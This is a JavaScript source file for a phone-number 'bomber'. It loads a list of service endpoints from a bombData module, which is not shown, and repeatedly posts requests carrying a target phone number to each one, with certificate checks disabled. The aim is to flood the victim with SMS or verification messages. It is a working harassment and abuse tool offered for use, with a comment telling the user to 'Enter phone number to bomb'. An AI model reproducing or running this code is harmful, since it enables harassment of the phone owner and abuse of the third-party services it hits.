const axios = require('axios');
const https = require('https');
const bm = require("./bombData");
const bombData = require('./bombData');


const phone_number = 0; //Enter phone number to bomb
const delay = 0; //delay in seconds
const start = 0;
const stop = 0; //frequency

const agent = new https.Agent({
    rejectUnauthorized: false
});

function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function startBombing(bombData, delay, start, stop, phno) {
    const bombDataClass = new bm(phno);
    const bombData = await bombDataClass.getBombData();
    for (let i = 0; i < bombData.length; i++) {
        console.log(i);
        let data = bombData[i];
        console.log(JSON.stringify(data));
        const instance = axios.create({
            baseURL: data.baseURL,
            httpsAgent: agent
        });
        instance.post(data.postUrl, data.postData, { headers: data.header })
            .then(response => {
                // Log the response data and headers
                console.log('Response Data:', response.data);
                console.log('Response Headers:', response.headers);
            })
            .catch(error => {
                console.error('Error:', JSON.stringify(error));
            });

        await wait(delay);
    }
    if (start < stop) {

        start = start + 1;
        startBombing(bombData, delay, start, stop, phone_number);
    }
}


startBombing(bombData, delay, start, stop, phone_number);








